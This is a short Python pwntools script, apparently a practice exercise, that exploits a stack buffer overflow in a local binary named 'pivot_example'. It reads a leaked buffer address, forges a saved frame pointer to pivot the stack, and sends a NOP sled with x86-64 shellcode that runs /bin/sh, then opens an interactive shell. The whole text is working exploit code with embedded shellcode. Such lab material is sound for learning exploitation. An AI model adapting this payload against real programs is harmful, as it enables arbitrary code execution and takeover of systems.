from pwn import *

p = process("./pivot_example")

#sfp 조작 어디로? buf
buf_addr = int(p.recvline().strip(), 16)
shell_code = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

log.info("buf : "+ hex(buf_addr))

payload = b'A'*8
payload += p64(buf_addr + 24)
payload += b'\x90'*16
payload += shell_code
payload += b'B'*(0x100 - len(payload))
payload += p64(buf_addr)

p.sendline(payload)

p.interactive()
